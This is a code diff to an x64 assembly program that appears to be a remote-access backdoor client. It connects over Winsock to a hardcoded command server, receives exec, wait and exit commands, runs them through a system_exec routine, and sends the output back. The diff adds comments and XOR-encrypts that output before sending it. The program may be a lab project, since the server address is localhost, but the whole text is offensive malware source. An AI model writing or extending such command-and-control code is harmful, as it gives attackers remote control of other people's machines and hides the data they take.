@@ -8,6 +8,11 @@ include ..\include\kernel32.inc
 include ..\include\winsock.inc
 include ..\include\ntdll.inc
 
+;
+; Definitions
+;
+
+; Constants
 status_failure  equ 0xffffffff
 status_success  equ 0
 max_retries     equ 10
@@ -17,6 +22,7 @@ cmd_exec        equ 001b
 cmd_exit        equ 010b
 cmd_wait        equ 100b
 
+; Structure(s)
 shellcode_msg struct
     command         byte ?
     key             byte ?
@@ -29,10 +35,16 @@ memcpy      proto   fastcall :qword, :qword, :dword
 xor_cipher  proto   fastcall :qword, :byte, :dword
 system_exec proto   fastcall :qword, :qword
 
+;
+; Global data section
+;
 .data
     g_command_ip        db "127.0.0.1", 0
     g_command_port      dw 1664
 
+;
+; Code section
+;
 .code
 
     main proc
@@ -44,6 +56,7 @@ system_exec proto   fastcall :qword, :qword
         local dw_socket_buffer_size:dword
         local cipher_key:byte
         local retries:dword
+        local bytes_read:dword
         ; Initialize Winsock
         invoke WSAStartup, 516, addr wsa_data
         test eax, eax
@@ -106,8 +119,12 @@ system_exec proto   fastcall :qword, :qword
                 jmp _wait
             .endif
 
+            ; Encrypt the response
+            mov bytes_read, eax
+            invoke xor_cipher, addr output_buffer, command_buffer.shellcode_msg.key, bytes_read
+
             ; Post the result back to the server
-            invoke send, dw_socket, addr output_buffer, eax, 0
+            invoke send, dw_socket, addr output_buffer, bytes_read, 0
         _wait:
             invoke Sleep, sleep_time
             .continue
@@ -236,7 +253,5 @@ system_exec proto   fastcall :qword, :qword
     _done:
         ret
     xor_cipher endp
-
-
 
 end
